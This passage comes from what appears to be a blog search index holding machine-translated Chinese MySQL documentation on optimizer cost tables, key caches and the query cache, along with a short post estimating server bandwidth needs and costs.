（默认0.1）比较记录密钥的成本。增加此值会导致查询计划比较许多密钥变得更加昂贵。例如，filesort与避免使用索引进行排序的查询计划相比，执行a的查询计划 变得相对昂贵。memory_temptable_create_cost（默认2.0），memory_temptable_row_cost （默认0.2）存储在MEMORY存储引擎中的内部创建的临时表的成本估算。增加这些值会增加使用内部临时表的成本估计值，并使优化程序偏好使用较少的查询计划。有关这些表的信息，请参见 第8.4.4节“MySQL中的内部临时表使用”。与相应磁盘参数（disk_temptable_create_cost， disk_temptable_row_cost）的默认值相比， 这些内存参数的较小默认值反映了处理基于内存的表的较低成本。row_evaluate_cost （默认0.2）评估记录条件的成本。与查询更少行的查询计划相比，增加此值会导致查询计划检查许多行变得更加昂贵。例如，与读取较少行的范围扫描相比，表扫描变得相对昂贵。该engine_cost表包含这些列：engine_name此成本估算适用的存储引擎的名称。名称不区分大小写。如果值是 default，则它适用于所有没有自己的命名条目的存储引擎。如果服务器在读取此表时未识别引擎名称，则会向错误日志写入警告。device_type此成本估算适用的设备类型。该列旨在为不同的存储设备类型指定不同的成本估算，例如硬盘驱动器与固态驱动器。目前，该信息未被使用，0是唯一允许的值。cost_name与server_cost表中相同。cost_value与server_cost表中相同。last_update与server_cost表中相同。comment与server_cost表中相同。对于主键engine_cost表是包含（一个元组cost_name， engine_name， device_type）个列，所以它不可能在这些列中的值的任意组合来创建多个条目。服务器识别这些表的cost_name 值engine_cost：io_block_read_cost （默认1.0）从磁盘读取索引或数据块的成本。与增加此值的查询计划相比，读取许多磁盘块的查询计划与读取更少磁盘块的查询计划相比变得更加昂贵。例如，与读取较少块的范围扫描相比，表扫描变得相对昂贵。memory_block_read_cost （默认1.0）与io_block_read_cost内存数据库缓冲区中的索引或数据块的读取相似，但代表了其成本。如果io_block_read_cost和 memory_block_read_cost值不同，则执行计划可能会在相同查询的两次运行之间更改。假设内存访问的成本低于磁盘访问的成本。在这种情况下，在数据读入缓冲池之前的服务器启动时，您可能会得到与查询运行后不同的计划，因为这样数据将存储在内存中。对成本模型数据库进行更改对于希望从其默认值更改成本模型参数的DBA，请尝试将值加倍或减半并测量结果。对参数io_block_read_cost和 memory_block_read_cost参数的更改最有可能产生有价值的结果。这些参数值使数据访问方法的成本模型能够考虑从不同来源读取信息的成本; 即从磁盘读取信息与读取存储器缓冲区中已有信息的成本。例如，所有其他条件相同，将io_block_read_cost值设置 为大于memory_block_read_cost优先级的值 会使优化器更喜欢查询计划，该计划将内存中已保存的信息读取到必须从磁盘读取的计划中。此示例显示如何更改以下内容的默认值 io_block_read_cost：更新mysql.engine_cost SET cost_value = 2.0 WHERE cost_name =&apos;io_block_read_cost&apos;;FLUSH OPTIMIZER_COSTS;此示例显示如何io_block_read_cost仅 更改InnoDB存储引擎的值 ：INSERT INTO mysql.engine_cost VALUES（&apos;InnoDB&apos;，0，&apos;io_block_read_cost&apos;，3.0， CURRENT_TIMESTAMP，&apos;为InnoDB使用较慢的磁盘&apos;）;FLUSH OPTIMIZER_COSTS;]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器带宽]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-deploy%2Fbandwidth%2F</url>
    <content type="text"><![CDATA[首先要知道影响在线人数的因素 1，访问量 2，网站类型：如果是出文字的网站(如小说站)，1M带宽带动日均5000IP，还勉强。如果是普通网站有图片，有文字、论坛、新闻资讯类型网站 大概1M能带一千IP。考虑到高峰期并发，1M高峰期还会卡。【最低配 单核CPU+512内存。1千IP CPU占用10%左右，内存200到300之间】。 下面根据影响因素计算下1M带宽能同时承受多少人在线(以网络状况良好为前提) 1、 打开网站8秒原则; 2、 评判的只是：用户从云服务器下载文件的速度; 3、 页面的标准尺寸大小为：60KB; 参考公式：支持连接个人 = 服务器带宽/页面尺寸大小 {———-} 通过计算大致结果是，1Mbps的带宽(服务器的1M带宽最快上下速度能达到1M/s，跟我们家用的带宽稍有区别)支持的连接数为：17个 因此，N M带宽可以支持的同时在线人数大概为N*17个 所以，1M带宽的云主机，日均3000IP以下应该没问题。当然如果你的每个页面都比较大的话，那就没这么多了。具体多少，可以按照上面的算法算下。 12345678910111213141516171819202122232425262728初次访问 362kb第二次访问 36kbpv 8641+2007+1000 = 11648pv * 362 = 4216576kb = 4117.75MB 4GB流量market初次171kb第二次 28kbpv= 3000pv * 171 = 513000 = =500.97MB一天按5GB 流量30天 是 150GB流量0.8 * 150 = 120RMB带宽5 Mbps 125 RMB10 Mbps 125 + （10 - 5 ）* 80RMB = =525 RMB元]]></content>
      <categories>
        <category>java</category>
        <category>service-deploy</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【缓存优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-cached%2F</url>
    <content type="text"><![CDATA[8.10.1 InnoDB缓冲池优化8.10.2 MyISAM密钥缓存8.10.3 MySQL查询缓存8.10.4准备好的语句和存储程序的缓存MySQL使用几种策略来缓存内存缓冲区中的信息以提高性能。 8.10.1 InnoDB缓冲池优化InnoDB维护一个称为缓冲池的存储区域， 用于缓存内存中的数据和索引。知道InnoDB缓冲池如何 工作，并利用它来将频繁访问的数据保存在内存中，是MySQL调优的一个重要方面。 有关InnoDB缓冲池内部工作原理的说明， LRU替换算法的概述以及常规配置信息，请参见第14.6.3.1节“InnoDB缓冲池”。 有关其他InnoDB缓冲池配置和调整信息，请参阅以下部分： 第14.6.3.5节“配置InnoDB缓冲池预取（预读）” 第14.6.3.6节“配置InnoDB缓冲池刷新” 第14.6.3.4节“使缓冲池扫描抗性” 第14.6.3.3节“配置多个缓冲池实例” 第14.6.3.8节“保存和恢复缓冲池状态” 第14.6.3.7节“微调InnoDB缓冲池刷新” 第14.6.3.2节“配置InnoDB缓冲池大小” {———-} 8.10.2 MyISAM密钥缓存8.10.2.1共享密钥缓存访问8.10.2.2多个密钥缓存8.10.2.3中点插入策略8.10.2.4索引预加载8.10.2.5密钥缓存块大小8.10.2.6重构密钥缓存为了最小化磁盘I / O，MyISAM存储引擎利用许多数据库管理系统使用的策略。它采用缓存机制将最常访问的表块保存在内存中： 对于索引块，维护称为密钥缓存（或 密钥缓冲区）的特殊结构 。该结构包含许多块缓冲区，其中放置了最常用的索引块。 对于数据块，MySQL不使用特殊缓存。相反，它依赖于本机操作系统文件系统缓存。 本节首先介绍MyISAM密钥缓存的基本操作 。然后讨论了可以提高密钥缓存性能并使您能够更好地控制缓存操作的功能： 多个会话可以同时访问缓存。 您可以设置多个密​​钥缓存并将表索引分配给特定缓存。 要控制密钥缓存的大小，请使用 key_buffer_size系统变量。如果将此变量设置为零，则不使用密钥缓存。如果key_buffer_size值太小而无法分配最小数量的块缓冲区，则不使用密钥缓存 （8）。 当密钥缓存不可操作时，仅使用操作系统提供的本机文件系统缓冲来访问索引文件。（换句话说，使用与表数据块相同的策略访问表索引块。） 索引块是对MyISAM索引文件的连续访问单元 。通常，索引块的大小等于索引B树的节点大小。（索引在磁盘上使用B树数据结构表示。树底部的节点是叶节点。叶节点上方的节点是非叶节点。） 密钥缓存结构中的所有块缓冲区大小相同。该大小可以等于，大于或小于表索引块的大小。通常这两个值中的一个是另一个的倍数。 当必须访问来自任何表索引块的数据时，服务器首先检查它是否在密钥缓存的某个块缓冲区中可用。如果是，则服务器访问密钥缓存中的数据而不是磁盘上的数据。也就是说，它从缓存读取或写入其中而不是读取或写入磁盘。否则，服务器选择包含不同表索引块（或块）的高速缓存块缓冲区，并用必需的表索引块的副本替换那里的数据。只要新索引块位于缓存中，就可以访问索引数据。 如果发生了选择替换的块已被修改，则该块被认为是“ 脏的。“在这种情况下，在被替换之前，其内容被刷新到它所来自的表索引。 通常服务器遵循LRU（最近最少使用）策略：当选择要替换的块时，它选择最近最少使用的索引块。为了使这个选择更容易，密钥缓存模块将所有使用的块维护在按使用时间排序的特殊列表（LRU链）中。访问块时，它是最近使用的块，位于列表的末尾。当需要替换块时，列表开头的块是最近最少使用的块，并成为第一个驱逐的候选块。 该InnoDB存储引擎还采用LRU算法来管理它的缓冲池。请参见 第14.6.3.1节“InnoDB缓冲池”。 8.10.2.1共享密钥缓存访问线程可以同时访问密钥缓存缓冲区，但要符合以下条件： 多个会话可以访问未更新的缓冲区。 正在更新的缓冲区会导致需要使用它的会话等待更新完成。 多个会话可以发起导致高速缓存块替换的请求，只要它们不相互干扰（即，只要它们需要不同的索引块，从而导致不同的高速缓存块被替换）。 对密钥缓存的共享访问使服务器能够显着提高吞吐量。 8.10.2.2多个密钥缓存对密钥缓存的共享访问可提高性能，但不会完全消除会话之间的争用。他们仍在竞争管理对密钥缓存缓冲区的访问的控制结构。为了进一步减少密钥缓存访问争用，MySQL还提供了多个密钥缓存。此功能使您可以将不同的表索引分配给不同的密钥缓存。 在存在多个密钥缓存的情况下，服务器必须知道在处理给定MyISAM表的查询时要使用哪个缓存 。默认情况下，所有 MyISAM表索引都缓存在默认密钥缓存中。要将表索引分配给特定的键缓存，请使用该CACHE INDEX 语句（请参见第13.7.6.2节“CACHE INDEX语法”）。例如，下面的语句从表中分配指标 t1，t2以及 t3名为键缓存 hot_cache： MySQL的&gt; CACHE INDEX t1, t2, t3 IN hot_cache; ——— + ——————– + ———- + ——- — +| 表| Op | Msg_type | Msg_text | ——— + ——————– + ———- + ——- — +| test.t1 | assign_to_keycache | 状态| 好的| test.t2 | assign_to_keycache | 状态| 好的| test.t3 | assign_to_keycache | 状态| 好的 ——— + ——————– + ———- + ——- — +CACHE INDEX可以SET GLOBAL通过使用参数设置语句或使用服务器启动选项设置其大小来创建语句中 引用的键高速缓存。例如： MySQL的&gt; SET GLOBAL keycache1.key_buffer_size=128*1024;要销毁密钥缓存，请将其大小设置为零： MySQL的&gt; SET GLOBAL keycache1.key_buffer_size=0;您无法销毁默认密钥缓存。任何尝试这样做都会被忽略： MySQL的&gt; SET GLOBAL key_buffer_size = 0; MySQL的&gt; SHOW VARIABLES LIKE ‘key_buffer_size’; —————– + ——— +| Variable_name | 值| —————– + ——— +| key_buffer_size | 8384512 | —————– + ——— +密钥缓存变量是具有名称和组件的结构化系统变量。For keycache1.key_buffer_size， keycache1是缓存变量名称， key_buffer_size是缓存组件。有关用于引用结构化密钥缓存系统变量的语法的说明，请参见第5.1.8.1节“结构化系统变量”。 默认情况下，表索引分配给在服务器启动时创建的主（默认）密钥缓存。销毁密钥缓存时，分配给它的所有索引都将重新分配给默认密钥缓存。 对于繁忙的服务器，您可以使用涉及三个密钥缓存的策略： 一个“ 热 ”键高速占用分配给所有键高速缓冲空间的20％。对于大量用于搜索但未更新的表使用此选项。 一个“ 冷 ”键高速占用分配给所有键高速缓冲空间的20％。将此缓存用于中型，密集修改的表，例如临时表。 一个“ 温暖 ”键高速占用键高速缓冲空间的60％。将此作为默认密钥缓存，默认情况下用于所有其他表。 使用三个密钥高速缓存有益的一个原因是对一个密钥高速缓存结构的访问不会阻止对其他密钥高速缓存的访问。访问分配给一个缓存的表的语句不会与访问分配给另一个缓存的表的语句竞争。性能提升也出于其他原因： 热缓存仅用于检索查询，因此永远不会修改其内容。因此，每当需要从磁盘引入索引块时，不需要首先刷新选择用于替换的高速缓存块的内容。 对于分配给热缓存的索引，如果不存在需要索引扫描的查询，则对应于索引B树的非叶节点的索引块很可能保留在缓存中。 当更新的节点在高速缓存中并且不需要首先从磁盘读入时，对于临时表最频繁执行的更新操作执行得更快。如果临时表的索引的大小与冷键高速缓存的大小相当，则更新的节点在高速缓存中的概率非常高。 该CACHE INDEX语句在表和密钥缓存之间建立关联，但每次服务器重新启动时关联都会丢失。如果希望关联在每次服务器启动时生效，则实现此目的的一种方法是使用选项文件：包括配置密钥缓存的变量设置，以及init-file命名包含CACHE INDEX 要执行的语句的文件的 选项。例如： key_buffer_size = 4Ghot_cache.key_buffer_size = 2Gcold_cache.key_buffer_size = 2Ginit_file = / path/ to/ data-directorymysqld_init.sqlmysqld_init.sql每次服务器启动时都会执行 语句。该文件每行应包含一个SQL语句。以下示例分别为hot_cache和 分配了几个表cold_cache： CACHE INDEX db1.t1，db1.t2，db2.t3在hot_cache中CACHE INDEX db1.t4，db2.t5，db2.t6在cold_cache中8.10.2.3中点插入策略默认情况下，密钥缓存管理系统使用简单的LRU策略来选择要逐出的密钥缓存块，但它还支持称为中点插入策略的更复杂的方法 。 使用中点插入策略时，LRU链分为两部分：热子列表和热子列表。两部分之间的分割点并不固定，但是密钥缓存管理系统注意到热部分不是 “ 太短 ”，总是包含至少 key_cache_division_limit 百分比的密钥缓存块。 key_cache_division_limit是结构化键缓存变量的组件，因此其值是可以为每个缓存设置的参数。 当索引块从表中读入密钥缓存时，它将放在暖子列表的末尾。在一定数量的命中（访问块）之后，它被提升到热子列表。目前，促进块（3）所需的命中数对于所有索引块是相同的。 升级到热子列表的块放在列表的末尾。然后该块在该子列表中循环。如果块在子列表的开头停留足够长的时间，则将其降级为暖子列表。此时间由key_cache_age_threshold 密钥缓存的组件的值确定 。 阈值规定，对于包含N块的密钥缓存，在最后一次N * key_cache_age_threshold / 100命中内未访问的热子列表开头的块 将被移动到暖子列表的开头。然后它成为第一个被驱逐的候选者，因为替换的块总是从暖子列表的开头获取。 中点插入策略使您可以将更多值的块始终保留在缓存中。如果您更喜欢使用普通LRU策略，请将 key_cache_division_limit 值设置为默认值100。 当执行需要索引扫描的查询有效地从缓存中推出对应于有价值的高级B树节点的所有索引块时，中点插入策略有助于提高性能。为避免这种情况，您必须使用key_cache_division_limit设置为远小于100 的中点插入策略 。然后，在索引扫描操作期间，有价值的频繁命中节点也会保留在热子列表中。 8.10.2.4索引预加载如果密钥缓存中有足够的块来保存整个索引的块，或者至少是与其非叶节点对应的块，则在开始使用之前使用索引块预加载密钥缓存是有意义的。预加载使您能够以最有效的方式将表索引块放入密钥缓存缓冲区：通过顺序从磁盘读取索引块。 在没有预加载的情况下，块仍然根据查询的需要放入密钥缓存中。虽然这些块将保留在缓存中，因为所有缓冲区都有足够的缓冲区，它们是以随机顺序从磁盘中提取的，而不是按顺序提取的。 要将索引预加载到缓存中，请使用该 LOAD INDEX INTO CACHE语句。例如，以下语句预加载表的索引的节点（索引块），t1并且t2： MySQL的&gt; LOAD INDEX INTO CACHE t1, t2 IGNORE LEAVES; ——— + ————– + ———- + ———- +| 表| Op | Msg_type | Msg_text | ——— + ————– + ———- + ———- +| test.t1 | preload_keys | 状态| 好的| test.t2 | preload_keys | 状态| 好的 ——— + ————– + ———- + ———- +所述IGNORE LEAVES改性剂导致要预装只为索引的非叶结点的块。因此，显示的语句预加载所有索引块t1，但仅从非叶节点预加载 t2。 如果已使用CACHE INDEX语句将索引分配给键高速缓存 ，则预加载会将索引块放入该高速缓存中。否则，索引将加载到默认密钥缓存中。 8.10.2.5密钥缓存块大小可以使用key_cache_block_size 变量为单个密钥缓存指定块缓冲区的大小 。这允许调整索引文件的I / O操作的性能。 当读取缓冲区的大小等于本机操作系统I / O缓冲区的大小时，可以实现I / O操作的最佳性能。但是，将关键节点的大小设置为等于I / O缓冲区的大小并不总能确保最佳的整体性能。在读取大叶子节点时，服务器会吸入大量不必要的数据，有效地阻止了读取其他叶子节点。 要控制表的.MYI 索引文件中块的大小MyISAM，请使用–myisam-block-size服务器启动时的 选项。 8.10.2.6重构密钥缓存可以通过更新其参数值随时重新构建密钥缓存。例如： MySQL的&gt; SET GLOBAL cold_cache.key_buffer_size=410241024;如果为key_buffer_size或 key_cache_block_size缓存组件分配 的值与组件的当前值不同，则服务器会销毁缓存的旧结构并根据新值创建新结构。如果缓存包含任何脏块，则服务器会在销毁和重新创建缓存之前将它们保存到磁盘。如果更改其他键缓存参数，则不会进行重组。 重构密钥缓存时，服务器首先将任何脏缓冲区的内容刷新到磁盘。之后，缓存内容变得不可用。但是，重组不会阻止需要使用分配给缓存的索引的查询。相反，服务器使用本机文件系统缓存直接访问表索引。文件系统缓存不如使用密钥缓存有效，因此尽管执行查询，但可以预期减速。重新构建缓存后，它将再次可用于缓存分配给它的索引，并且对索引的文件系统缓存的使用将停止。 8.10.3 MySQL查询缓存8.10.3.1查询缓存的运行方式8.10.3.2查询缓存SELECT选项8.10.3.3查询缓存配置8.10.3.4查询缓存状态和维护注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 查询缓存存储SELECT语句的文本以及 发送到客户端的相应结果。如果稍后收到相同的语句，则服务器从查询缓存中检索结果，而不是再次解析和执行语句。查询缓存在会话之间共享，因此可以发送由一个客户端生成的结果集以响应由另一个客户端发出的相同查询。 查询缓存在您拥有不经常更改且服务器接收许多相同查询的表的环境中非常有用。这是许多基于数据库内容生成许多动态页面的Web服务器的典型情况。 查询缓存不返回过时数据。修改表时，将刷新查询缓存中的所有相关条目。 注意查询缓存在多个mysqld服务器更新相同 MyISAM表的环境中不起作用。 查询高速缓存用于第8.10.3.1节“查询高速缓存如何操作”中描述的条件下的预准备语句。 注意分区表不支持查询缓存，并且对涉及分区表的查询自动禁用查询缓存。无法为此类查询启用查询缓存。 下面是查询缓存的一些性能数据。这些结果是通过在具有2GB RAM和64MB查询缓存的Linux Alpha 2×500MHz系统上运行MySQL基准测试套件生成的。 如果您执行的所有查询都很简单（例如从具有一行的表中选择一行），但仍然不同以便无法缓存查询，则使查询缓存处于活动状态的开销为13％。这可能被认为是最糟糕的情况。在现实生活中，查询往往要复杂得多，因此开销通常会显着降低。 在单行表中搜索单行的查询缓存比没有查询缓存快238％。这可以被视为接近缓存的查询所期望的最小加速。 要在服务器启动时禁用查询缓存，请将query_cache_size系统变量设置 为0.通过禁用查询缓存代码，没有明显的开销。 查询缓存提供了实质性性能改进的潜力，但不要假设它将在所有情况下都这样做。使用某些查询缓存配置或服务器工作负载，您实际上可能会看到性能下降： 请谨慎调整查询缓存的大小，这会增加维护缓存所需的开销，可能超出启用缓存的优势。数十兆字节的大小通常是有益的。数百兆字节的大小可能不是。 服务器工作负载对查询缓存效率有显着影响。几乎完全由一组固定SELECT 语句组成的查询混合更有可能从启用缓存中获益，而不是频繁INSERT语句导致缓存中结果连续失效的混合 。在某些情况下，解决方法是使用该 SQL_NO_CACHE选项来防止结果甚至为SELECT使用频繁修改的表的语句进入缓存 。（请参见 第8.10.3.2节“查询缓存SELECT选项”。） 要验证启用查询缓存是否有益，请在启用和禁用缓存的情况下测试MySQL服务器的操作。然后定期重新测试，因为查询缓存效率可能会随着服 8.10.3.1查询缓存的运行方式注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 本节介绍查询缓存在运行时的工作方式。第8.10.3.3节“查询缓存配置”描述了如何控制它是否可操作。 在解析之前，将传入的查询与查询缓存中的查询进行比较，因此查询缓存将以下两个查询视为不同： SELECT FROM tbl_name选择来自tbl_name查询必须完全相同（字节为字节）才能看作相同。另外，由于其他原因，可以将相同的查询字符串视为不同。使用不同数据库，不同协议版本或不同默认字符集的查询被视为不同的查询，并单独缓存。 缓存不用于以下类型的查询： 查询是外部查询的子查询 在存储的函数，触发器或事件的主体内执行的查询 在从查询缓存中获取查询结果之前，MySQL会检查用户是否拥有所 SELECT涉及的所有数据库和表的权限。如果不是这种情况，则不使用缓存的结果。 如果从查询缓存返回查询结果，则服务器会递增Qcache_hits 状态变量，而不是Com_select。请参见 第8.10.3.4节“查询缓存状态和维护”。 如果表更改，则使用该表的所有高速缓存查询都将变为无效并从高速缓存中删除。这包括使用MERGE映射到已更改表的表的查询。一个表可以被许多类型的语句，如被改变INSERT， UPDATE， DELETE， TRUNCATE TABLE， ALTER TABLE， DROP TABLE，或 DROP DATABASE。 使用InnoDB表时，查询缓存也可在事务中使用 。 SELECT缓存查询对视图 的结果。 查询缓存适用于SELECT SQL_CALC_FOUND_ROWS …查询并存储由以下SELECT FOUND_ROWS()查询返回的值。 FOUND_ROWS()即使从缓存中提取了前面的查询，也会返回正确的值，因为找到的行数也存储在缓存中。该SELECT FOUND_ROWS()查询本身不能被缓存。 使用mysql_stmt_prepare()和 使用二进制协议发布的预准备语句mysql_stmt_execute()（请参见 第27.8.8节“C API准备语句”）受限于缓存。与查询缓存中的语句的比较基于扩展?参数标记后的语句文本。该语句仅与使用二进制协议执行的其他缓存语句进行比较。也就是说，对于查询缓存目的，使用二进制协议发出的预准备语句与使用文本协议发布的预准备语句不同（请参见 第13.5节“准备的SQL语句语法”）。 如果查询使用以下任何功能，则无法缓存该查询： AES_DECRYPT() AES_ENCRYPT() BENCHMARK() CONNECTION_ID() CONVERT_TZ() CURDATE() CURRENT_DATE() CURRENT_TIME() CURRENT_TIMESTAMP() CURRENT_USER() CURTIME() DATABASE() ENCRYPT() 有一个参数 FOUND_ROWS() GET_LOCK() IS_FREE_LOCK() IS_USED_LOCK() LAST_INSERT_ID() LOAD_FILE() MASTER_POS_WAIT() NOW() PASSWORD() RAND() RANDOM_BYTES() RELEASE_ALL_LOCKS() RELEASE_LOCK() SLEEP() SYSDATE() UNIX_TIMESTAMP() 没有参数 USER() UUID() UUID_SHORT() 在这些条件下也不会缓存查询： 它指的是用户定义的函数（UDF）或存储的函数。 它指的是用户变量或本地存储的程序变量。 它是指在表mysql， INFORMATION_SCHEMA或 performance_schema数据库。 它指的是任何分区表。 它具有以下任何一种形式： 选择…锁定共享模式SELECT … FOR UPDATESELECT … INTO OUTFILE ……SELECT … INTO DUMPFILE …SELECT * FROM … WHERE autoincrement_col为NULL最后一个表单未缓存，因为它用作ODBC解决方法以获取最后一个插入ID值。请参见第27章连接器和API的Connector / ODBC部分 。 使用SERIALIZABLE隔离级别的事务中的语句 也无法缓存，因为它们使用LOCK IN SHARE MODE锁定。 它使用TEMPORARY表格。 它不使用任何表。 它会生成警告。 用户对任何涉及的表都具有列级权限。 8.10.3.2查询缓存SELECT选项注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 可以在SELECT语句中指定两个与查询缓存相关的选项 ： SQL_CACHE 如果查询结果是可缓存的，并且query_cache_type系统变量的值为ON或 ，则缓存查询结果 DEMAND。 SQL_NO_CACHE 服务器不使用查询缓存。它既不检查查询缓存，也不检查结果是否已缓存，也不缓存查询结果。 例子： SELECT SQL_CACHE id，name FROM customer;SELECT SQL_NO_CACHE id，name FROM customer;8.10.3.3查询缓存配置注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 该have_query_cache服务器系统变量指示查询缓存是否可用： MySQL的&gt; SHOW VARIABLES LIKE ‘have_query_cache’; —————— + ——- +| Variable_name | 值| —————— + ——- +| have_query_cache | 是的| —————— + ——- +使用标准MySQL二进制文件时YES，即使禁用了查询缓存，此值也始终 如此。 其他几个系统变量控制查询缓存操作。这些可以在启动mysqld时在选项文件或命令行中设置。查询缓存系统变量都具有以…开头的名称 query_cache_。第5.1.7节“服务器系统变量”中对它们进行了简要介绍 ，并在此处给出了其他配置信息。 要设置查询缓存的大小，请设置 query_cache_size系统变量。将其设置为0将禁用查询缓存，设置也是如此query_cache_type=0。默认情况下，禁用查询缓存。这是使用默认大小1M实现的，默认 query_cache_type值为0。 要显着降低开销，请在query_cache_type=0不使用查询缓存的情况下启动服务器 。 注意使用Windows配置向导安装或配置MySQL时，query_cache_size将根据可用的不同配置类型自动为您配置默认值 。使用Windows配置向导时，由于所选配置，可能会启用查询缓存（即设置为非零值）。查询缓存也由query_cache_type变量的设置控制 。配置完成后，检查my.ini文件中设置的这些变量的值 。 设置query_cache_size 为非零值时，请记住查询缓存需要最小大小约40KB才能分配其结构。（确切的大小取决于系统架构。）如果将值设置得太小，您将收到警告，如下例所示： MySQL的&gt; SET GLOBAL query_cache_size = 40000;查询正常，0行受影响，1警告（0.00秒） MySQL的&gt; SHOW WARNINGS\G*** 1. row ** *** 等级：警告 代码：1282消息：查询缓存未能设置大小39936; 新查询缓存大小为0 MySQL的&gt; SET GLOBAL query_cache_size = 41984;查询OK，0行受影响（0.00秒） MySQL的&gt; SHOW VARIABLES LIKE ‘query_cache_size’; —————— + ——- +| Variable_name | 值| —————— + ——- +| query_cache_size | 41984 | —————— + ——- +要使查询缓存实际上能够保存任何查询结果，必须将其大小设置得更大： MySQL的&gt; SET GLOBAL query_cache_size = 1000000;查询正常，0行受影响（0.04秒） MySQL的&gt; SHOW VARIABLES LIKE ‘query_cache_size’; —————— + ——– +| Variable_name | 值| —————— + ——– +| query_cache_size | 999424 | —————— + ——– +一排（0.00秒）该query_cache_size值与最近的1024字节块对齐。因此，报告的值可能与您指定的值不同。 如果查询缓存大小大于0，则该 query_cache_type变量会影响其工作方式。此变量可以设置为以下值： 值的 缓存0或OFF阻止缓存或检索缓存结果的值。 除了以那些开头的语句之外的 值的值1或ON启用缓存 SELECT SQL_NO_CACHE。 值的值2或 DEMAND导致仅缓存那些以＃开头的语句SELECT SQL_CACHE。 如果query_cache_size为0，则还应将query_cache_type变量设置 为0.在这种情况下，服务器根本不会获取查询缓存互斥锁，这意味着无法在运行时启用查询缓存，并且减少了查询执行的开销。 设置该GLOBAL query_cache_type值可确定在进行更改后连接的所有客户端的查询缓存行为。各个客户端可以通过设置SESSION query_cache_type值来控制自己连接的缓存行为 。例如，客户端可以禁用查询缓存的使用，如下所示： MySQL的&gt; SET SESSION query_cache_type = OFF;如果设置query_cache_type 为服务器启动（而不是在运行时使用 SET 语句），则只允许使用数值。 要控制可以缓存的单个查询结果的最大大小，请设置 query_cache_limit系统变量。默认值为1MB。 注意不要将缓存的大小设置得太大。由于线程需要在更新期间锁定缓存，因此您可能会看到一个非常大的缓存的锁争用问题。 注意您可以SET 使用 命令行或配置文件中的选项，使用该语句 设置可在运行时为查询缓存指定的最大大小 。 –maximum-query_cache_size=32M 当要缓存查询时，其结果（发送到客户端的数据）在结果检索期间存储在查询缓存中。因此，数据通常不会在一个大块中处理。查询高速缓存分配用于按需存储该数据的块，因此当填充一个块时，分配新块。由于内存分配操作成本高昂（按时间），查询缓存会分配具有query_cache_min_res_unit 系统变量给定的最小大小的块 。执行查询时，将最后一个结果块修剪为实际数据大小，以释放未使用的内存。根据服务器执行的查询类型，您可能会发现调整以下值的方法很有帮助 query_cache_min_res_unit： 默认值为 query_cache_min_res_unit 4KB。这应该适用于大多数情况。 如果您有大量具有较小结果的查询，则默认块大小可能会导致内存碎片，如大量空闲块所示。由于内存不足，碎片可以强制查询缓存从缓存中删除（删除）查询。在这种情况下，减少值 query_cache_min_res_unit。由于修剪而删除的空闲块和查询的数量由Qcache_free_blocks和 Qcache_lowmem_prunes 状态变量的值给出 。 如果您的大多数查询都有大的结果（检查 Qcache_total_blocks和 Qcache_queries_in_cache 状态变量），您可以通过增加来提高性能 query_cache_min_res_unit。但是，请注意不要太大（请参阅上一项）。 8.10.3.4查询缓存状态和维护注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 要检查MySQL服务器中是否存在查询缓存，请使用以下语句： MySQL的&gt; SHOW VARIABLES LIKE ‘have_query_cache’; —————— + ——- +| Variable_name | 值| —————— + ——- +| have_query_cache | 是的| —————— + ——- +您可以对查询缓存进行碎片整理，以便通过FLUSH QUERY CACHE语句更好地利用其内存。该语句不会从缓存中删除任何查询。 该RESET QUERY CACHE语句从查询缓存中删除所有查询结果。该 FLUSH TABLES声明也做到这一点。 要监视查询缓存性能，请使用 SHOW STATUS查看缓存状态变量： MySQL的&gt; SHOW STATUS LIKE ‘Qcache%’; ————————- + ——– +| Variable_name | 值| ————————- + ——– +| Qcache_free_blocks | 36 || Qcache_free_memory | 138488 || Qcache_hits | 79570 || Qcache_inserts | 27087 || Qcache_lowmem_prunes | 3114 || Qcache_not_cached | 22989 || Qcache_queries_in_cache | 415 || Qcache_total_blocks | 912 | ————————- + ——– +第5.1.9节“服务器状态变量” 中给出了每个变量的描述 。这里描述了它们的一些用途。 SELECT 查询 总数由以下公式给出： Com_select Qcache_hits+解析器发现错误的查询该Com_select值由以下公式给出： Qcache_inserts Qcache_not_cached+在列权限检查期间发现错误的查询查询缓存使用可变长度的块，所以 Qcache_total_blocks与 Qcache_free_blocks可指示查询高速缓冲存储器碎片。之后 FLUSH QUERY CACHE，只剩下一个空闲区块。 每个缓存的查询至少需要两个块（一个用于查询文本，一个或多个用于查询结果）。此外，查询使用的每个表都需要一个块。但是，如果两个或多个查询使用同一个表，则只需要分配一个表块。 Qcache_lowmem_prunes状态变量 提供的信息 可以帮助您调整查询缓存大小。它计算已从缓存中删除的查询数，以释放内存以缓存新查询。查询缓存使用最近最少使用（LRU）策略来决定从缓存中删除哪些查询。调整信息在 第8.10.3.3节“查询高速缓存配置”中给出。 8.10.4准备好的语句和存储程序的缓存对于客户端可能在会话期间多次执行的某些语句，服务器会将语句转换为内部结构并缓存要在执行期间使用的结构。缓存使服务器能够更有效地执行，因为它避免了在会话期间再次需要时重新转换语句的开销。这些语句发生转换和缓存： 准备好的语句，包括在SQL级别（使用PREPARE语句）处理的语句和使用二进制客户端/服务器协议（使用mysql_stmt_prepare()C API函数）处理的语句 。所述 max_prepared_stmt_count 系统变量控制语句的服务器高速缓存的总数量。（所有会话中准备好的语句总数。） 存储的程序（存储过程和函数，触发器和事件）。在这种情况下，服务器转换并缓存整个程序体。该 stored_program_cache系统变量指示存储的程序每个会话的服务器缓存的大致数量。 服务器基于每个会话维护预准备语句和存储程序的高速缓存。其他会话无法访问为一个会话缓存的语句。会话结束时，服务器会丢弃为其缓存的任何语句。 